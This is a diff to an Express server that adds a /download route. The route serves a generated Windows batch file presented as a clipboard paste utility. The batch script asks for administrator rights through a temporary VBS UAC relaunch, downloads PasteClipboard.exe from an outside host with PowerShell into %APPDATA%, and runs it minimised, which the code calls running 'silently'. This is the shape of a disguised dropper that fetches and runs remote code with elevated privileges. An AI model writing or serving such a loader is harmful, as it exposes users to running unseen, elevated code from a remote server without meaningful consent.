@@ -16,11 +16,47 @@ app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Route to serve the batch file
-app.get('/run_paste.bat', (req, res) => {
+// Direct download endpoint for the batch file
+app.get('/download', (req, res) => {
     res.setHeader('Content-Type', 'application/x-bat');
     res.setHeader('Content-Disposition', 'attachment; filename=run_paste.bat');
-    res.sendFile(path.join(__dirname, 'public', 'run_paste.bat'));
+    
+    // Generate a batch file content that runs silently
+    const batchContent = `@echo off
+>nul 2>&1 "%SYSTEMROOT%\\system32\\cacls.exe" "%SYSTEMROOT%\\system32\\config\\system"
+if '%errorlevel%' NEQ '0' (
+    echo Requesting administrative privileges...
+    goto UACPrompt
+) else ( goto gotAdmin )
+
+:UACPrompt
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\\getadmin.vbs"
+    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\\getadmin.vbs"
+    "%temp%\\getadmin.vbs"
+    exit /B
+
+:gotAdmin
+    if exist "%temp%\\getadmin.vbs" ( del "%temp%\\getadmin.vbs" )
+    pushd "%CD%"
+    CD /D "%~dp0"
+
+:: Set paths
+set "exeUrl=https://pspaste-service.onrender.com/PasteClipboard.exe"
+set "localPath=%APPDATA%\\PSPaste\\PasteClipboard.exe"
+
+:: Create directory if it doesn't exist
+if not exist "%APPDATA%\\PSPaste" mkdir "%APPDATA%\\PSPaste"
+
+:: Download the file if it doesn't exist
+if not exist "%localPath%" (
+    powershell -Command "(New-Object Net.WebClient).DownloadFile('%exeUrl%', '%localPath%')"
+)
+
+:: Execute silently
+start /min "" "%localPath%"
+exit`;
+
+    res.send(batchContent);
 });
 
 // Route to serve the executable
